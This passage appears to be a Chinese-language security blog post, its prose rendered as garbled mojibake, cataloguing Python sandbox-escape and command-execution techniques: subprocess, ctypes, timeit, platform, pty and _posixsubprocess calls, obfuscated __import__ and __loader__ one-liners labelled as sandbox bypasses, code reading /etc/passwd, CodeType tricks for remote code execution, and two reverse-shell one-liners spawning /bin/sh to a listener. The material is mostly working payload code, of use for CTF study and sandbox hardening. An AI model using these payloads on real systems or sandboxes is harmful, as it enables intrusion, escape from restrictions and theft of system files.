<td>âœ…ï¼ˆç›´æ¥è¿”å› stdoutï¼‰</td>
<td><strong>æ€»æ˜¯ shell&#x3D;True</strong></td>
</tr>
<tr>
<td><code>getstatusoutput</code></td>
<td>py3</td>
<td><code>(int, str)</code></td>
<td>æ— </td>
<td>âœ…ï¼ˆè¿”å› exit code å’Œ stdoutï¼‰</td>
<td><strong>æ€»æ˜¯ shell&#x3D;True</strong></td>
</tr>
</tbody></table>
<h4 id="Popen-ç³»åˆ—ï¼ˆåº•å±‚æ„é€ ï¼Œçµæ´»åº¦æœ€é«˜ï¼‰"><a href="#Popen-ç³»åˆ—ï¼ˆåº•å±‚æ„é€ ï¼Œçµæ´»åº¦æœ€é«˜ï¼‰" class="headerlink" title="Popen ç³»åˆ—ï¼ˆåº•å±‚æ„é€ ï¼Œçµæ´»åº¦æœ€é«˜ï¼‰"></a><code>Popen</code> ç³»åˆ—ï¼ˆåº•å±‚æ„é€ ï¼Œçµæ´»åº¦æœ€é«˜ï¼‰</h4><p>ç›´æ¥å¯åŠ¨ä¸€ä¸ªæ–°è¿›ç¨‹ï¼Œå¯ä»¥é…ç½® <code>stdin</code> &#x2F; <code>stdout</code> &#x2F; <code>stderr</code> ç®¡é“ã€æ˜¯å¦ç”¨ shellã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">subprocess.Popen(args, bufsize=-<span class="number">1</span>, executable=<span class="literal">None</span>,</span><br><span class="line">                 stdin=<span class="literal">None</span>, stdout=<span class="literal">None</span>, stderr=<span class="literal">None</span>,</span><br><span class="line">                 shell=<span class="literal">False</span>, cwd=<span class="literal">None</span>, env=<span class="literal">None</span>, ...)</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>args</code>ï¼šè¦æ‰§è¡Œçš„å‘½ä»¤ï¼ˆå­—ç¬¦ä¸²æˆ–åˆ—è¡¨ï¼‰</li>
<li><code>stdout</code> &#x2F; <code>stderr</code> &#x2F; <code>stdin</code>ï¼šæ§åˆ¶æ ‡å‡†æµï¼ˆé»˜è®¤ç»§æ‰¿çˆ¶è¿›ç¨‹ï¼‰</li>
<li><code>shell</code>ï¼šæ˜¯å¦é€šè¿‡ shell æ‰§è¡Œï¼ˆ<code>/bin/sh</code> æˆ– <code>cmd.exe</code>ï¼‰</li>
</ul>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="comment"># æ‰§è¡Œå‘½ä»¤å¹¶è¯»å–è¾“å‡º</span></span><br><span class="line">subprocess.Popen(</span><br><span class="line">    <span class="string">&#x27;ls&#x27;</span>,                     <span class="comment"># argsï¼šè¦æ‰§è¡Œçš„å‘½ä»¤ï¼ˆå› ä¸º shell=Trueï¼Œæ‰€ä»¥æ˜¯å­—ç¬¦ä¸²ï¼‰</span></span><br><span class="line">    shell=<span class="literal">True</span>,               <span class="comment"># é€šè¿‡ shell è¿è¡Œï¼ˆLinux é»˜è®¤ /bin/shï¼‰</span></span><br><span class="line">    stdout=subprocess.PIPE,   <span class="comment"># æŠŠå­è¿›ç¨‹çš„ stdout é‡å®šå‘åˆ°ç®¡é“</span></span><br><span class="line">    stderr=subprocess.STDOUT  <span class="comment"># æŠŠ stderr åˆå¹¶åˆ° stdout</span></span><br><span class="line">).stdout.read()               <span class="comment"># ä» stdout ç®¡é“ä¸­ä¸€æ¬¡æ€§è¯»å–å…¨éƒ¨å†…å®¹</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ²™ç®±ç»•è¿‡ï¼šåŠ¨æ€å¯¼å…¥</span></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;subprocess&#x27;</span>).Popen(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></div>

<h4 id="é˜»å¡æ‰§è¡Œå¹¶è·å–çŠ¶æ€-è¾“å‡º"><a href="#é˜»å¡æ‰§è¡Œå¹¶è·å–çŠ¶æ€-è¾“å‡º" class="headerlink" title="é˜»å¡æ‰§è¡Œå¹¶è·å–çŠ¶æ€&#x2F;è¾“å‡º"></a>é˜»å¡æ‰§è¡Œå¹¶è·å–çŠ¶æ€&#x2F;è¾“å‡º</h4><p>è°ƒç”¨åä¼šç­‰å¤–éƒ¨å‘½ä»¤æ‰§è¡Œç»“æŸå†è¿”å›ï¼ˆé™¤éè¶…æ—¶æˆ–è¢«ä¿¡å·ä¸­æ–­ï¼‰</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line">subprocess.call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)          <span class="comment"># è¿”å› exit code</span></span><br><span class="line">subprocess.check_call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)    <span class="comment"># exit code !=0 æŠ›å¼‚å¸¸</span></span><br><span class="line">subprocess.check_output(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)  <span class="comment"># è¿”å›è¾“å‡ºï¼ˆstrï¼‰</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># python3</span></span><br><span class="line">subprocess.run(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)           <span class="comment"># è¿”å› CompletedProcess å¯¹è±¡</span></span><br><span class="line">subprocess.getoutput(<span class="string">&#x27;whoami&#x27;</span>)                 <span class="comment"># è¿”å›è¾“å‡ºï¼ˆç®€åŒ–ç‰ˆï¼‰</span></span><br><span class="line">subprocess.getstatusoutput(<span class="string">&#x27;whoami&#x27;</span>)           <span class="comment"># è¿”å› (exit_code, output)</span></span><br><span class="line">subprocess.call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)          <span class="comment"># åŒ py2</span></span><br><span class="line">subprocess.check_call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)    <span class="comment"># åŒ py2</span></span><br><span class="line">subprocess.check_output(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)  <span class="comment"># åŒ py2</span></span><br></pre></td></tr></table></figure></div>

<h3 id="ctypes-æ¨¡å—"><a href="#ctypes-æ¨¡å—" class="headerlink" title="ctypes æ¨¡å—"></a>ctypes æ¨¡å—</h3><p><code>ctypes</code> æ¨¡å—å¯ä»¥ç›´æ¥è°ƒç”¨ C è¯­è¨€åŠ¨æ€é“¾æ¥åº“ï¼ˆDLL &#x2F; so &#x2F; dylibï¼‰ä¸­çš„å‡½æ•°ï¼Œæ¯”å¦‚ <code>system()</code>ï¼Œä»è€Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p>
<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><p>åœ¨ç±» Unix ç³»ç»Ÿä¸­ï¼Œ<code>system</code> å‡½æ•°é€šå¸¸åœ¨ <strong>libc</strong> é‡Œï¼Œå¯ä»¥ç”¨ <code>ctypes.CDLL(None)</code> æˆ–ç›´æ¥æŒ‡å®šåº“åã€‚</p>
 <div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"><span class="comment"># å½“å‰è¿›ç¨‹å·²åŠ è½½çš„ libc</span></span><br><span class="line">libc = ctypes.CDLL(<span class="literal">None</span>)  </span><br><span class="line">libc.system(<span class="string">b&#x27;ls ./&#x27;</span>)      <span class="comment"># æ³¨æ„ä¼ å…¥å­—èŠ‚ä¸²</span></span><br></pre></td></tr></table></figure></div>

<p>æˆ–è€…æ›´ç¨³å¦¥ï¼ˆæ˜¾å¼åŠ è½½ libcï¼‰ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes, ctypes.util</span><br><span class="line">libc = ctypes.CDLL(ctypes.util.find_library(<span class="string">&#x27;c&#x27;</span>))</span><br><span class="line">libc.system(<span class="string">b&#x27;ls /&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p>æ²™ç®±ä¸­å¯ä»¥è¿™ä¹ˆç”¨ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;ctypes&#x27;</span>).CDLL(<span class="literal">None</span>).system(<span class="string">&#x27;ls /&#x27;</span>.encode())</span><br></pre></td></tr></table></figure></div>

<h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><p>Windows ä¸Š <code>ctypes.CDLL(None)</code> ä¸å¯ç”¨ï¼Œ<code>system</code> åœ¨ MSVCRT æˆ– UCRT åº“ä¸­ã€‚</p>
<blockquote>
<p>åœ¨ <strong>POSIX ç³»ç»Ÿ</strong>ï¼ˆLinux&#x2F;macOSï¼‰é‡Œï¼Œ<code>CDLL(None)</code> ä¼šè®© <code>ctypes</code> è°ƒç”¨åº•å±‚çš„ <code>dlopen(NULL, flags)</code>ã€‚<code>dlopen(NULL, ...)</code> çš„è¯­ä¹‰æ˜¯ï¼šè¿”å›å½“å‰è¿›ç¨‹å·²ç»åŠ è½½çš„ä¸»ç¨‹åºï¼ˆå’Œå®ƒä¾èµ–çš„åº“ï¼‰çš„ç¬¦å·è¡¨ã€‚</p>
<p>Windows ä¸‹ <code>ctypes.CDLL</code> åº•å±‚è°ƒç”¨çš„æ˜¯ <code>LoadLibrary()</code>ï¼ˆæˆ– <code>LoadLibraryEx()</code>ï¼‰ã€‚ä¼  <code>None</code> ç›¸å½“äº <code>LoadLibrary(NULL)</code>ï¼Œè€Œåœ¨ Windows API é‡Œï¼š<code>NULL</code> <strong>ä¸æ˜¯</strong> â€œå½“å‰è¿›ç¨‹çš„ç¬¦å·è¡¨â€ï¼Œè€Œæ˜¯è¢«å½“æˆä¸€ä¸ªæ— æ•ˆæŒ‡é’ˆ â†’ å¯¼è‡´ <code>ctypes</code> å†…éƒ¨æƒ³è§£æè·¯å¾„æ—¶æŠ¥é”™ï¼ˆä½ çœ‹åˆ°çš„ <code>TypeError: argument of type &#39;NoneType&#39; is not iterable</code> å°±æ˜¯è¿™é‡Œè§¦å‘çš„ï¼‰</p>
<p>Windows å¦‚æœä½ æƒ³æ‹¿åˆ°â€œå½“å‰è¿›ç¨‹å·²åŠ è½½çš„æ¨¡å—â€ï¼Œå¾—ç”¨ <code>GetModuleHandle()</code>ï¼Œè€Œä¸”è¦ä¼ ä¸€ä¸ªå·²ç»åŠ è½½çš„ DLL åï¼Œæ¯”å¦‚ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">handle = ctypes.windll.kernel32.GetModuleHandleW(<span class="string">&quot;msvcrt.dll&quot;</span>)</span><br></pre></td></tr></table></figure></div>
</blockquote>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ–¹å¼ 1ï¼šANSI ç‰ˆæœ¬ï¼ˆå­—èŠ‚ä¸²ï¼‰</span></span><br><span class="line">msvcrt = ctypes.CDLL(<span class="string">&#x27;msvcrt&#x27;</span>)         <span class="comment"># æˆ– &#x27;ucrtbase&#x27;</span></span><br><span class="line">msvcrt.system(<span class="string">b&#x27;cmd /c dir&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ–¹å¼ 2ï¼šUnicode ç‰ˆæœ¬ï¼ˆå­—ç¬¦ä¸²ï¼‰</span></span><br><span class="line">ucrt = ctypes.CDLL(<span class="string">&#x27;ucrtbase&#x27;</span>)</span><br><span class="line">ucrt._wsystem.argtypes = [ctypes.c_wchar_p]</span><br><span class="line">ucrt._wsystem(<span class="string">&quot;cmd /c dir&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>æ²™ç®±ç»•è¿‡å†™æ³•ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;ctypes&#x27;</span>).CDLL(<span class="string">&#x27;msvcrt&#x27;</span>).system(<span class="string">b&#x27;cmd /c dir&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="timeit-æ¨¡å—"><a href="#timeit-æ¨¡å—" class="headerlink" title="timeit æ¨¡å—"></a>timeit æ¨¡å—</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;</span>,number=<span class="number">1</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="platform-æ¨¡å—"><a href="#platform-æ¨¡å—" class="headerlink" title="platform æ¨¡å—"></a>platform æ¨¡å—</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line">platform.sys.modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">platform.os.system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="pty-æ¨¡å—"><a href="#pty-æ¨¡å—" class="headerlink" title="pty æ¨¡å—"></a>pty æ¨¡å—</h3><p>ä»…é™ Linux ç¯å¢ƒ</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pty</span><br><span class="line">pty.spawn(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;pty&#x27;</span>).spawn(<span class="string">&quot;ls&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="posixsubprocess-æ¨¡å—"><a href="#posixsubprocess-æ¨¡å—" class="headerlink" title="_posixsubprocess æ¨¡å—"></a>_posixsubprocess æ¨¡å—</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> _posixsubprocess</span><br><span class="line"></span><br><span class="line">_posixsubprocess.fork_exec([<span class="string">b&quot;/bin/cat&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>], [<span class="string">b&quot;/bin/cat&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(os.pipe()), <span class="literal">False</span>, <span class="literal">False</span>,<span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>, <span class="literal">False</span>)</span><br></pre></td></tr></table></figure></div>

<p>ç»“åˆ <code>__loader__.load_module(fullname)</code> å¯¼å…¥æ¨¡å—</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__loader__.load_module(<span class="string">&#x27;_posixsubprocess&#x27;</span>).fork_exec([<span class="string">b&quot;/bin/cat&quot;</span>,<span class="string">&quot;/etc/passwd&quot;</span>], [<span class="string">b&quot;/bin/cat&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(__loader__.load_module(<span class="string">&#x27;os&#x27;</span>).pipe()), <span class="literal">False</span>, <span class="literal">False</span>,<span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>, <span class="literal">False</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="åå¼¹-shell"><a href="#åå¼¹-shell" class="headerlink" title="åå¼¹ shell"></a>åå¼¹ shell</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">12345</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>);os.dup2(s.fileno(),<span class="number">2</span>);<span class="keyword">import</span> pty; pty.spawn(<span class="string">&quot;/bin/sh&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="built_in">__import__</span>(<span class="string">&#x27;socket&#x27;</span>).socket(<span class="built_in">__import__</span>(<span class="string">&#x27;socket&#x27;</span>).AF_INET,<span class="built_in">__import__</span>(<span class="string">&#x27;socket&#x27;</span>).SOCK_STREAM);s.connect((<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">12345</span>));[<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).dup2(s.fileno(),i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)];<span class="built_in">__import__</span>(<span class="string">&#x27;pty&#x27;</span>).spawn(<span class="string">&quot;/bin/sh&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="æ„é€ ä»£ç å¯¹è±¡è¿›è¡Œ-RCE"><a href="#æ„é€ ä»£ç å¯¹è±¡è¿›è¡Œ-RCE" class="headerlink" title="æ„é€ ä»£ç å¯¹è±¡è¿›è¡Œ RCE"></a>æ„é€ ä»£ç å¯¹è±¡è¿›è¡Œ RCE</h3><p><strong><code>CodeType</code></strong> æ˜¯ Python å†…ç½®çš„ä»£ç å¯¹è±¡ç±»å‹ï¼Œè¡¨ç¤ºç¼–è¯‘åçš„å­—èŠ‚ç ï¼ˆç”± <code>compile()</code> ç”Ÿæˆï¼‰ã€‚æ‰€æœ‰å‡½æ•°çš„ <code>__code__</code> å±æ€§å°±æ˜¯ä¸€ä¸ª CodeType å¯¹è±¡ã€‚CodeType ä¸­åŒ…å«äº†ï¼š</p>
<ul>
<li><code>co_code</code>ï¼šå­—èŠ‚ç æŒ‡ä»¤</li>
<li><code>co_consts</code>ï¼šå¸¸é‡æ± </li>
<li><code>co_names</code>ï¼šå…¨å±€å˜é‡å</li>
<li><code>co_varnames</code>ï¼šå±€éƒ¨å˜é‡å</li>
<li>ä»¥åŠå †æ ˆå¤§å°ã€å‚æ•°ä¸ªæ•°ã€è°ƒè¯•ä¿¡æ¯ç­‰</li>
</ul>
<p>Python ä¸å…è®¸ç›´æ¥ä¿®æ”¹ <code>code.co_code</code> ç­‰å±æ€§ï¼ˆåªè¯»ï¼‰ã€‚ä½†æ˜¯ï¼š</p>
<ul>
<li>å¯ä»¥ç»™å‡½æ•°ç›´æ¥æ¢ä¸€ä¸ªæ–°çš„ <code>__code__</code> å¯¹è±¡ã€‚</li>
<li>å¯ä»¥æ„é€ æ–°çš„ CodeType å¯¹è±¡ï¼ˆæˆ–è€…ç”¨ <code>replace()</code> ä¿®æ”¹ï¼‰ï¼Œå®ç°ä»»æ„æŒ‡ä»¤æ³¨å…¥ã€‚</li>
<li>å¯ä»¥ç”¨ <code>exec()</code> æˆ– <code>types.FunctionType()</code> ç›´æ¥è¿è¡Œè¿™ä¸ª CodeType å¯¹è±¡ã€‚</li>
</ul>
<p>å› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>CodeType</code> è¿›è¡Œ RCEã€‚</p>
<h4 id="æ‰§è¡Œ-CodeType-å¯¹è±¡"><a href="#æ‰§è¡Œ-CodeType-å¯¹è±¡" class="headerlink" title="æ‰§è¡Œ CodeType å¯¹è±¡"></a>æ‰§è¡Œ CodeType å¯¹è±¡</h4><p>æœ‰ä¸¤ç§æ–¹å¼å¯ä»¥æ‰§è¡Œä»£ç å¯¹è±¡ï¼š</p>
<ul>
<li><p>æ–¹æ³• 1ï¼šexec æ¨¡å¼</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> types</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">open</span>(<span class="string">&quot;/etc/passwd&quot;</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span>(read.__code__, &#123;<span class="string">&#x27;__builtins__&#x27;</span>: __builtins__&#125;)</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>æ–¹æ³• 2ï¼šFunctionType åŒ…è£…</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> types</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">open</span>(<span class="string">&quot;/etc/passwd&quot;</span>).read())</span><br><span class="line"></span><br><span class="line">fn = types.FunctionType(read.__code__, &#123;<span class="string">&#x27;__builtins__&#x27;</span>: __builtins__&#125;)</span><br><span class="line">fn()</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h4 id="æ›¿æ¢å‡½æ•°çš„-code"><a href="#æ›¿æ¢å‡½æ•°çš„-code" class="headerlink" title="æ›¿æ¢å‡½æ•°çš„ code"></a>æ›¿æ¢å‡½æ•°çš„ code</h4><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">open</span>(<span class="string">&quot;/etc/passwd&quot;</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">target</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">target.__code__ = read.__code__</span><br><span class="line">target()  <span class="comment"># ç›¸å½“äºæ‰§è¡Œ read()</span></span><br></pre></td></tr></table></figure></div>

<h4 id="æ„é€ æ–°çš„-CodeType-å¯¹è±¡"><a href="#æ„é€ æ–°çš„-CodeType-å¯¹è±¡" class="headerlink" title="æ„é€ æ–°çš„ CodeType å¯¹è±¡"></a>æ„é€ æ–°çš„ CodeType å¯¹è±¡</h4><p>ä¸åŒç‰ˆæœ¬ <code>CodeType</code> çš„æ„é€ å‚æ•°ä¸åŒï¼š</p>
<ul>
<li><strong>Python â‰¤ 3.7</strong>ï¼šå‚æ•°å°‘ï¼ˆæ—  <code>posonlyargcount</code> &#x2F; <code>qualname</code>ï¼‰ã€‚</li>
<li><strong>Python 3.8</strong>ï¼šæ–°å¢ <code>posonlyargcount</code>ï¼Œå¹¶å¼•å…¥ **<code>code.replace()</code>**ã€‚</li>
<li><strong>Python 3.11</strong>ï¼šç»“æ„æ”¹åŠ¨å¤§ï¼Œå¼•å…¥ <code>co_linetable</code>ã€<code>co_exceptiontable</code>ã€‚</li>
</ul>
<p>æŸ¥çœ‹å½“å‰ç‰ˆæœ¬éœ€è¦çš„å‚æ•°ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> types</span><br><span class="line"><span class="built_in">help</span>(types.CodeType)</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p>æ‰‹åŠ¨æ„é€ ï¼ˆä¸æ¨èï¼Œå®¹æ˜“è¸©ç‰ˆæœ¬å‘ï¼‰ï¼Œä»¥ Python 3.11 ä¸ºä¾‹ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> types</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">open</span>(<span class="string">&quot;/etc/passwd&quot;</span>).read())</span><br><span class="line"></span><br><span class="line">c = read.__code__</span><br><span class="line">CodeType = <span class="built_in">type</span>(c)</span><br><span class="line"></span><br><span class="line">codeobj = CodeType(</span><br><span class="line">    c.co_argcount, c.co_posonlyargcount, c.co_kwonlyargcount,</span><br><span class="line">    c.co_nlocals, c.co_stacksize, c.co_flags,</span><br><span class="line">    c.co_code, c.co_consts, c.co_names, c.co_varnames,</span><br><span class="line">    c.co_filename, c.co_name, c.co_qualname,</span><br><span class="line">    c.co_firstlineno, c.co_linetable, c.co_exceptiontable,</span><br><span class="line">    c.co_freevars, c.co_cellvars</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span>(codeobj, &#123;<span class="string">&#x27;__builtins__&#x27;</span>: __builtins__&#125;)</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>ç”¨ replaceï¼ˆæ¨èï¼Œ3.8+ï¼‰</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">open</span>(<span class="string">&quot;/etc/passwd&quot;</span>).read())</span><br><span class="line"></span><br><span class="line">new_code = read.__code__.replace(</span><br><span class="line">    co_consts=read.__code__.co_consts + (<span class="string">&#x27;/etc/passwd&#x27;</span>,)</span><br><span class="line">)</span><br><span class="line"><span class="built_in">exec</span>(new_code, &#123;<span class="string">&#x27;__builtins__&#x27;</span>: __builtins__&#125;)</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>ç”¨ compile ç›´æ¥ç”Ÿæˆ CodeType</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload_code = <span class="built_in">compile</span>(<span class="string">&#x27;print(open(&quot;/etc/passwd&quot;).read())&#x27;</span>, <span class="string">&#x27;&lt;x&gt;&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line"><span class="built_in">exec</span>(payload_code, &#123;<span class="string">&#x27;__builtins__&#x27;</span>: __builtins__&#125;)</span><br></pre></td></tr></table></figure></div></li>
</ul>
